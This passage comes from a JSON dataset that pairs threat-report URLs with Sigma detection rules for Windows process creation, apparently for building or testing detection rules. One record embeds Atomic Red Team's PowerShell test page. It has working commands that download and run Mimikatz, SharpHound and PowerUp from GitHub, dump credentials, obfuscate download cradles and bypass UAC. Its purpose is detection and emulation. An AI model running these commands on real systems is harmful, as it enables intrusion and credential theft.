      "description": "Detects potential arbitrary file download using a Microsoft Office application",
      "references": [
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/",
        "https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/",
        "https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), Beyu Denis, oscd.community",
      "date": "2022-05-17",
      "modified": "2023-06-22",
      "tags": [
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\EXCEL.EXE",
              "\\POWERPNT.EXE",
              "\\WINWORD.exe"
            ]
          },
          {
            "OriginalFileName": [
              "Excel.exe",
              "POWERPNT.EXE",
              "WinWord.exe"
            ]
          }
        ],
        "selection_http": {
          "CommandLine|contains": [
            "http://",
            "https://"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_office_arbitrary_cli_download.yml",
    "id": "318"
  },
  {
    "url": "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
      "id": "435e10e4-992a-4281-96f3-38b11106adde",
      "related": [
        {
          "id": "db885529-903f-4c5d-9864-28fe199e6370",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
        "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-10",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADComputer ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_computer_discovery_get_adcomputer.yml",
    "id": "333"
  },
  {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
    "markdown": "# T1059.001 - PowerShell\n\n## Description from ATT&CK\n\n> Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the `Start-Process` cmdlet which can be used to run an executable and the `Invoke-Command` cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n>\n> PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n>\n> A number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.(Citation: Github PSAttack)\n>\n> PowerShell commands/scripts can also be executed without directly invoking the `powershell.exe` binary through interfaces to PowerShell's underlying `System.Management.Automation` assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)\n\n## Atomic Tests\n\n- Atomic Test #1 - Mimikatz\n- Atomic Test #2 - Run BloodHound from local disk\n- Atomic Test #3 - Run Bloodhound from Memory using Download Cradle\n- Atomic Test #4 - Obfuscation Tests\n- Atomic Test #5 - Mimikatz - Cradlecraft PsSendKeys\n- Atomic Test #6 - Invoke-AppPathBypass\n- Atomic Test #7 - Powershell MsXml COM object - with prompt\n- Atomic Test #8 - Powershell XML requests\n- Atomic Test #9 - Powershell invoke mshta.exe download\n- Atomic Test #10 - Powershell Invoke-DownloadCradle\n- Atomic Test #11 - PowerShell Fileless Script Execution\n- Atomic Test #12 - PowerShell Downgrade Attack\n- Atomic Test #13 - NTFS Alternate Data Stream Access\n- Atomic Test #14 - PowerShell Session Creation and Use\n- Atomic Test #15 - ATHPowerShellCommandLineParameter -Command parameter variations\n- Atomic Test #16 - ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments\n- Atomic Test #17 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations\n- Atomic Test #18 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments\n- Atomic Test #19 - PowerShell Command Execution\n- Atomic Test #20 - PowerShell Invoke Known Malicious Cmdlets\n- Atomic Test #21 - PowerUp Invoke-AllChecks\n\n---\n\n## Atomic Test #1 - Mimikatz\n\nDownload Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** f3132740-55bc-48c4-bcc0-758a459cd027\n\n### Inputs:\n\n| Name   | Description    | Type | Default Value |\n|--------|----------------|------|---------------|\n| mimurl | Mimikatz url   | Url  | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 |\n\n### Attack Commands: Run with `command_prompt`!  Elevation Required (e.g. root or admin)\n\n```\npowershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"\n```\n\n---\n\n## Atomic Test #2 - Run BloodHound from local disk\n\nUpon execution SharpHound will be downloaded to disk, imported and executed. It will set up collection methods, run and then compress and store the data to the temp directory on the machine. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** a21bb23e-e677-4ee7-af90-6931b57b6350\n\n### Inputs:\n\n| Name      | Description               | Type   | Default Value |\n|-----------|---------------------------|--------|---------------|\n| file_path | File path for SharpHound payload | String | PathToAtomicsFolder\\T1059.001\\src |\n\n### Attack Commands: Run with `powershell`!\n\n```\nwrite-host \"Import and Execution of SharpHound.ps1 from #{file_path}\" -ForegroundColor Cyan\nimport-module #{file_path}\\SharpHound.ps1\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n```\n\n### Cleanup Commands:\n\n```\nRemove-Item $env:Temp\\*BloodHound.zip -Force\n```\n\n---\n\n## Atomic Test #3 - Run Bloodhound from Memory using Download Cradle\n\nUpon execution SharpHound will load into memory and execute against a domain. It will set up collection methods, run and then compress and store the data to the temp directory. If system is unable to contact a domain, proper execution will not occur.\n\nSuccessful execution will produce stdout message stating \"SharpHound Enumeration Completed\". Upon completion, final output will be a *BloodHound.zip file.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** bf8c1441-4674-4dab-8e4e-39d93d08f9b7\n\n### Attack Commands: Run with `powershell`!\n\n```\nwrite-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5\n```\n\n### Cleanup Commands:\n\n```\nRemove-Item $env:Temp\\*BloodHound.zip -Force\n```\n\n---\n\n## Atomic Test #4 - Obfuscation Tests\n\nDifferent obfuscated methods to test. Upon execution, reaches out to bit.ly/L3g1t and displays: \"SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION\"\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 4297c41a-8168-4138-972d-01f3ee92c804\n\n### Attack Commands: Run with `powershell`!\n\n```\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))\n(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()\nSet-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&(''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))\n```\n\n---\n\n## Atomic Test #5 - Mimikatz - Cradlecraft PsSendKeys\n\nRun mimikatz via PsSendKeys. Upon execution, automated actions will take place to open file explorer, open notepad and input code, then mimikatz dump info will be displayed.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** af1800cf-9f9d-4fd1-a709-14b1e6de020d\n\n### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin)\n\n```\n$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\\Software\\Microsoft\\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',(String).Split('}')[0].Split('=')[5]),@('StatusBar',0))|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS|?{(Item Variable:_).Value.id-ieq$curpid}|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')|ForEach{$wshell.SendKeys((Item Variable:_).Value)}};@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr\n```\n\n---\n\n## Atomic Test #6 - Invoke-AppPathBypass\n\nNote: Windows 10 only. Upon execution windows backup and restore window will be opened.\n\nBypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 06a220b6-7e29-4bd8-9d07-5b4d86742372\n\n### Attack Commands: Run with `command_prompt`!\n\n```\nPowershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n```\n\n---\n\n## Atomic Test #7 - Powershell MsXml COM object - with prompt\n\nPowershell MsXml COM object. Not proxy aware, removing cache although does not appear to write to those locations. Upon execution, \"Download Cradle test success!\" will be displayed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 388a7340-dbc1-4c9d-8e59-b75ad8c6d5da\n\n### Inputs:\n\n| Name | Description         | Type | Default Value |\n|------|---------------------|------|---------------|\n| url  | url of payload to execute | Url  | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1 |\n\n### Attack Commands: Run with `command_prompt`!\n\n```\npowershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"\n```\n\n---\n\n## Atomic Test #8 - Powershell XML requests\n\nPowershell xml download request. Upon execution, \"Download Cradle test success!\" will be dispalyed.\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 4396927f-e503-427b-b023-31049b9b09a6\n\n### Inputs:\n\n| Name | Description         | Type | Default Value |\n|------|---------------------|------|---------------|\n| url  | url of payload to execute | Url  | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml |\n\n### Attack Commands: Run with `command_prompt`!\n\n```\n\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"\n```\n\n---\n\n## Atomic Test #9 - Powershell invoke mshta.exe download\n\nPowershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display \"Download Cradle test success!\".\n\nProvided by https://github.com/mgreen27/mgreen27.github.io\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 8a2ad40b-12c7-4b25-8521-2737b0a415af\n\n### Inputs:\n\n| Name | Description         | Type | Default Value |\n|------|---------------------|------|---------------|\n| url  | url of payload to execute | Url  | https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct |\n\n### Attack Commands: Run with `command_prompt`!\n\n```\nC:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"\n```\n\n---\n\n## Atomic Test #10 - Powershell Invoke-DownloadCradle\n\nProvided by https://github.com/mgreen27/mgreen27.github.io Invoke-DownloadCradle is used to generate Network and Endpoint artifacts.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** cc50fa2a-a4be-42af-a88f-e347ba0bf4d7\n\n### Run it with these steps!\n\n1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1\n\n---\n\n## Atomic Test #11 - PowerShell Fileless Script Execution\n\nExecution of a PowerShell payload from the Windows Registry similar to that seen in fileless malware infections. Upon exection, open \"C:\\Windows\\Temp\" and verify that art-marker.txt is in the folder.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** fa050f5e-bc75-4230-af73-b6fd7852cd73\n\n### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin)\n\n```\n# Encoded payload in next command is the following \"Set-Content -path \"$env:SystemRoot/Temp/art-marker.txt\" -value \"Hello from the Atomic Red Team\"\"\nreg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\"\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))\n```\n\n### Cleanup Commands:\n\n```\nRemove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore\n```\n\n---\n\n## Atomic Test #12 - PowerShell Downgrade Attack\n\nThis test requires the manual installation of PowerShell V2.\n\nAttempts to run powershell commands in version 2.0 https://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 9148e7c4-9356-420e-a416-e896e9c0f73e\n\n### Attack Commands: Run with `powershell`!\n\n```\npowershell.exe -version 2 -Command Write-Host $PSVersion\n```\n\n---\n\n## Atomic Test #13 - NTFS Alternate Data Stream Access\n\nCreates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 8e5c5532-1181-4c1d-bb79-b3a9f5dbd680\n\n### Inputs:\n\n| Name      | Description                          | Type   | Default Value |\n|-----------|--------------------------------------|--------|---------------|\n| ads_file  | File created to store Alternate Stream Data | String | $env:TEMP\\NTFS_ADS.txt |\n\n### Attack Commands: Run with `powershell`!\n\n```\nAdd-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand\n```\n\n### Cleanup Commands:\n\n```\nRemove-Item #{ads_file} -Force -ErrorAction Ignore\n```\n\n---\n\n## Atomic Test #14 - PowerShell Session Creation and Use\n\nConnect to a remote powershell session and interact with the host. Upon execution, network test info and 'T1086 PowerShell Session Creation and Use' will be displayed.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 7c1acec2-78fa-4305-a3e0-db2a54cddecd\n\n### Inputs:\n\n| Name                | Description                                      | Type   | Default Value |\n|---------------------|--------------------------------------------------|--------|---------------|\n| hostname_to_connect | The host to connect to, by default it will connect to the local machine | String | $env:COMPUTERNAME |\n\n### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin)\n\n```\nNew-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\n```\n\n---\n\n## Atomic Test #15 - ATHPowerShellCommandLineParameter -Command parameter variations\n\nExecutes powershell.exe with variations of the -Command parameter\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 686a9785-f99b-41d4-90df-66ed515f81d7\n\n### Inputs:\n\n| Name                     | Description                                | Type   | Default Value |\n|--------------------------|--------------------------------------------|--------|---------------|\n| command_line_switch_type  | The type of supported command-line switch to use | String | Hyphen        |\n| command_param_variation   | The \"Command\" parameter variation to use   | String | C             |\n\n### Attack Commands: Run with `powershell`!\n\n```\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop\n```\n\n---\n\n## Atomic Test #16 - ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments\n\nExecutes powershell.exe with variations of the -Command parameter with encoded arguments supplied\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 1c0a870f-dc74-49cf-9afc-eccc45e58790\n\n### Inputs:\n\n| Name                          | Description                                | Type   | Default Value |\n|-------------------------------|--------------------------------------------|--------|---------------|\n| command_line_switch_type       | The type of supported command-line switch to use | String | Hyphen        |\n| command_param_variation        | The \"Command\" parameter variation to use   | String | C             |\n| encoded_arguments_param_variation | The \"EncodedArguments\" parameter variation to use | String | EA            |\n\n### Attack Commands: Run with `powershell`!\n\n```\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\n```\n\n---\n\n## Atomic Test #17 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations\n\nExecutes powershell.exe with variations of the -EncodedCommand parameter\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 86a43bad-12e3-4e85-b97c-4d5cf25b95c3\n\n### Inputs:\n\n| Name                          | Description                                | Type   | Default Value |\n|-------------------------------|--------------------------------------------|--------|---------------|\n| command_line_switch_type       | The type of supported command-line switch to use | String | Hyphen        |\n| encoded_command_param_variation | The \"EncodedCommand\" parameter variation to use | String | E             |\n\n### Attack Commands: Run with `powershell`!\n\n```\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop\n```\n\n---\n\n## Atomic Test #18 - ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments\n\nExecutes powershell.exe with variations of the -EncodedCommand parameter with encoded arguments supplied\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 0d181431-ddf3-4826-8055-2dbf63ae848b\n\n### Inputs:\n\n| Name                          | Description                                | Type   | Default Value |\n|-------------------------------|--------------------------------------------|--------|---------------|\n| encoded_command_param_variation | The \"EncodedCommand\" parameter variation to use | String | E             |\n| command_line_switch_type       | The type of supported command-line switch to use | String | Hyphen        |\n| encoded_arguments_param_variation | The \"EncodedArguments\" parameter variation to use | String | EncodedArguments |\n\n### Attack Commands: Run with `powershell`!\n\n```\nOut-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop\n```\n\n---\n\n## Atomic Test #19 - PowerShell Command Execution\n\nUse of obfuscated PowerShell to execute an arbitrary command; outputs \"Hello, from PowerShell!\". Example is from the 2021 Threat Detection Report by Red Canary.\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** a538de64-1c74-46ed-aa60-b995ed302598\n\n### Inputs:\n\n| Name            | Description                                      | Type   | Default Value |\n|-----------------|--------------------------------------------------|--------|---------------|\n| obfuscated_code | Defaults to: Invoke-Expression with a \"Write-Host\" line. | String | JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA== |\n\n### Attack Commands: Run with `command_prompt`!\n\n```\npowershell.exe -e  #{obfuscated_code}\n```\n\n---\n\n## Atomic Test #20 - PowerShell Invoke Known Malicious Cmdlets\n\nPowershell execution of known Malicious PowerShell Cmdlets\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 49eb9404-5e0f-4031-a179-b40f7be385e3\n\n### Inputs:\n\n| Name            | Description                                      | Type   | Default Value |\n|-----------------|--------------------------------------------------|--------|---------------|\n| Malicious_cmdlets | Known Malicious Cmdlets                          | String | \"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\" |\n\n### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin)\n\n```\n$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n```\n\n---\n\n## Atomic Test #21 - PowerUp Invoke-AllChecks\n\nCheck for privilege escalation paths using PowerUp from PowerShellMafia\n\n**Supported Platforms:** Windows\n\n**auto_generated_guid:** 1289f78d-22d2-4590-ac76-166737e1811b\n\n### Attack Commands: Run with `powershell`!\n\n```\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n```",
    "sigma_rule": {
      "title": "Suspicious Execution of Powershell with Base64",
      "id": "fb843269-508c-4b76-8b8d-88679db22ce7",
      "status": "test",
      "description": "Commandline to launch powershell with a base64 payload",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
        "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/"
      ],
      "author": "frack113",
      "date": "2022-01-02",
      "modified": "2023-01-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -e ",
            " -en ",
            " -enc ",
            " -enco",
            " -ec "
          ]
        },
        "filter_encoding": {
          "CommandLine|contains": " -Encoding "
        },
        "filter_azure": {
          "ParentImage|contains": [
            "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\",
            "\\gc_worker.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_encode.yml",
    "id": "348"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Execution of Powershell with Base64",
      "id": "fb843269-508c-4b76-8b8d-88679db22ce7",
      "status": "test",
      "description": "Commandline to launch powershell with a base64 payload",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.001/T1059.001.md#atomic-test-20---powershell-invoke-known-malicious-cmdlets",
        "https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/",
        "https://mikefrobbins.com/2017/06/15/simple-obfuscation-with-powershell-using-base64-encoding/"
      ],
      "author": "frack113",
      "date": "2022-01-02",
      "modified": "2023-01-05",
      "tags": [
        "attack.execution",
        "attack.t1059.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\powershell.exe",
            "\\pwsh.exe"
          ],
          "CommandLine|contains": [
            " -e ",
            " -en ",
            " -enc ",
            " -enco",
            " -ec "
          ]
        },
        "filter_encoding": {
          "CommandLine|contains": " -Encoding "
        },
        "filter_azure": {
          "ParentImage|contains": [
            "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\",
            "\\gc_worker.exe"
          ]
        },
        "condition": "selection and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_encode.yml",
    "id": "349"
  },
  {
    "url": "https://redcanary.com/blog/yellow-cockatoo/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious XOR Encoded PowerShell Command",
      "id": "bb780e0c-16cf-4383-8383-1e5471db6cf9",
      "related": [
        {
          "id": "5b572dcf-254b-425c-a8c5-d9af6bea35a6",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects presence of a potentially xor encoded powershell command",
      "references": [
